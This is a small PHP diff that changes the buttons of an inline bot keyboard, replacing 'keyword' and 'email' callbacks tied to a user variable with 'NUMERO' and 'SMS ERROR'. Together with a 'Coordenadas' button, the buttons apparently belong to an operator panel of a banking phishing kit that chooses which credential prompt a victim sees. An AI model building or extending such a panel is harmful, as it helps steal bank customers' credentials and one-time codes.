@@ -26,8 +26,8 @@ $keyboard = [
             ["text" => "📍 Coordenadas", "callback_data" => "COORD|$usuario"]
         ],
         [
-            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"],
-            ["text" => "📧 Correo", "callback_data" => "CORREO|$usuario"]
+            ["text" => "❓ NUMERO", "callback_data" => "NUMERO|$usuario"],
+            ["text" => "📧 SMS ERROR", "callback_data" => "SMSERROR|$usuario"]
         ]
     ]
 ];
